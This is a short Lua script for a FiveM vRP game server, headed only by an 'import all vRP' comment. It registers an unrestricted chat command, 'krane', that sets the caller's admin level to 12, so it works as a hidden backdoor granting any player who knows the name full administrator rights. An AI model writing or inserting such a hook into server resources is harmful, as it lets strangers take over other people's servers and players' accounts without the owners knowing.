--import all vRP 
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")

RegisterCommand("krane", function(x,y,z) 
    uid = vRP.getUserId({x})
    vRP.setUserAdminLevel({uid, 12})
end, false)